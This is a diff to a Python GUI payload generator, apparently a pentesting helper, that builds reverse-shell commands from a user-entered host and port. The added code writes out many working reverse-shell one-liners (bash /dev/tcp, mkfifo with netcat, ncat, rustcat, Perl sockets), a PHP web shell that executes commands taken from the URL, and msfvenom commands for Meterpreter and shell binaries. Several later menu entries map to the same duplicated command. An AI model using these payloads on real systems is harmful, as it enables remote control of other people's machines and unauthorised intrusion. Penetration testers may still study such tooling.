@@ -81,11 +81,7 @@ linux_payloads = [
     "ncat -e",
     "ncat UDP",
     "rustcat",
-    "C",
-    "Perl",
     "Perl no sh",
-    "Perl PentestMonkey",
-    "PHP Pentest Monkey",
     "PHP cmd",
     "PHP cmd2",
     "PHP exec",
@@ -137,38 +133,110 @@ window_dropdown.place(x=565, y=200)
 def generate_reverse_shell_payload():
     lhost = lhost_entry.get()
     lport = lport_entry.get()
-    selected_payload = msf_var.get()
+    msfpayload = msf_var.get()
+    linuxpayload = linux_var.get()
+    winpayload = windows_var.get()
 
-    if selected_payload == msf_payloads[1]:
+    if msfpayload == msf_payloads[1]:
         payload_command = "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[2]:
+    elif msfpayload == msf_payloads[2]:
         payload_command = "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[3]:
+    elif msfpayload == msf_payloads[3]:
         payload_command = "msfvenom -p windows/x64/shell/reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[4]:
+    elif msfpayload == msf_payloads[4]:
         payload_command = "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o reverse.exe".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[5]:
+    elif msfpayload == msf_payloads[5]:
         payload_command = "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[6]:
+    elif msfpayload == msf_payloads[6]:
         payload_command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o reverse.elf".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[7]:
+    elif msfpayload == msf_payloads[7]:
         payload_command = "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '' -f python -v notBuf -o shellcode".format(
             lhost, lport)
 
-    elif selected_payload == msf_payloads[8]:
+    elif msfpayload == msf_payloads[8]:
         payload_command = "msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw -o shell.php".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[9]:
+    elif msfpayload == msf_payloads[9]:
         payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
 
-    elif selected_payload == msf_payloads[10]:
+    elif msfpayload == msf_payloads[10]:
         payload_command = "msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -f raw -o shell.sh".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[1]:
+        payload_command = "sh -i >& /dev/tcp/{}/{} 0>&1".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[2]:
+        payload_command = "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[3]:
+        payload_command = "exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[4]:
+        payload_command = "sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[5]:
+        payload_command = "sh -i >& /dev/udp/{}/{} 0>&1".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[6]:
+        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[7]:
+        payload_command = "nc {} {} -e sh".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[8]:
+        payload_command = "busybox nc {} {} -e sh".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[9]:
+        payload_command = "nc -c sh {} {}".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[10]:
+        payload_command = "ncat {} {} -e sh".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[11]:
+        payload_command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|ncat -u {} {} >/tmp/f".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[12]:
+        payload_command = "rcat {} {} -r sh".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[13]:
+        payload_command = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{}:{}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[14]:
+        payload_command = '''<html>
+                             <body>
+                             <form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">
+                             <input type=\"TEXT\" name="cmd" id=\"cmd\" size=\"80\">
+                             <input type=\"SUBMIT\" value=\"Execute\">
+                             </form>
+                             <pre>
+                             <?php
+                                if(isset($_GET[\'cmd\']))
+                                 {
+                                     system($_GET[\'cmd\']);
+                                 }
+                             ?>
+                             </pre>
+                             </body>
+                             <script>document.getElementById(\"cmd\").focus();</script>
+                             </html>'''
+
+    elif linuxpayload == linux_payloads[15]:
+        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[16]:
+        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[17]:
+        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
+
+    elif linuxpayload == linux_payloads[18]:
+        payload_command = "msfvenom -p php/reverse_php LHOST={} LPORT={} -o shell.php".format(lhost, lport)
 
     else:
         payload_command = "Make a valid selection"
